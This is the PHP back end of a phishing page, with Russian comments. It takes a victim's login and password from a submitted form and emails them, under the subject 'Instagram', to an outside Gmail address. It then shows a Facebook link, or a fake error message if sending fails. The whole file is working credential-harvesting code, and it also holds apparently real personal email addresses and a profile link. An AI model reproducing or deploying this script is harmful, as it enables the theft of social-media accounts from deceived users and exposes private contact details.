<?php
$log = $_POST['log'];//Трогать нельзя
$pass = $_POST['pass'];//Трогать нельзя
$log = htmlspecialchars($log);//Трогать нельзя
$pass = htmlspecialchars($pass);//Трогать нельзя
$log = urldecode($log);//Трогать нельзя
$pass = urldecode($pass);//Трогать нельзя
$log = trim($log);//Трогать нельзя
$pass = trim($pass);//Трогать нельзя

if (mail("summer26uk@gmail.com", "Instagram", "Логин:".$log.".
Пароль: ".$pass ,"From: nastyabayko2@gmail.com \r\n"))

 {     echo '<a href="https://www.facebook.com/">https://www.facebook.com/</a>';
 
} else {
    echo "При входе в вашу почту возникли ошибки";//Лучше не трогать
}?>

//https://www.facebook.com/profile.php?id=100015112591988